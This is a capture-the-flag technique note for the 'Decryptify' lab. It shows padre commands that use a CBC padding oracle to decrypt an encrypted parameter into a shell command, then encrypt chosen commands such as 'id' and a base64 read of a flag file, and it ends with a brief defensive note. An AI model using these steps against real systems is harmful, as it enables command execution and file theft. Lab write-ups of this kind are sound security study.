# Padding Oracle to Command Injection

Used on: **Decryptify**

When an encrypted CBC parameter has a padding oracle and the decrypted value is executed as a shell command, the attacker can both decrypt existing values and encrypt chosen commands.

## Prerequisites

- CBC-encrypted parameter reflected into an endpoint.
- Distinguishable padding errors.
- Session cookies or authentication needed to reach the oracle.
- A tool such as Padre.

## Decrypt Existing Value

```bash
padre -cookie 'PHPSESSID=...; role=...' \
  -u "http://$TARGET:1337/dashboard.php?date=$" \
  'P6HqVqxBsuk77Gu7l8M+RrsLU8qI48mSEoqaOYAW1+Y='
```

Decryptify returned:

```text
date +%Y
```

## Encrypt Chosen Commands

```bash
padre -cookie 'PHPSESSID=...; role=...' \
  -u "http://$TARGET:1337/dashboard.php?date=$" \
  -enc 'id'
```

For commands where spaces break handling, use shell syntax that avoids spaces:

```bash
padre -cookie 'PHPSESSID=...; role=...' \
  -u "http://$TARGET:1337/dashboard.php?date=$" \
  -enc 'base64</home/ubuntu/flag.txt'
```

Decode output:

```bash
echo "OUTPUT_BASE64" | base64 -d
```

## Defensive Note

Use authenticated encryption, return uniform errors, and never pass decrypted user-controlled values into shell execution.

## Related

- [../../tools/web/padre.md](../../tools/web/padre.md)
- [php-mt-rand-token-prediction.md](php-mt-rand-token-prediction.md)


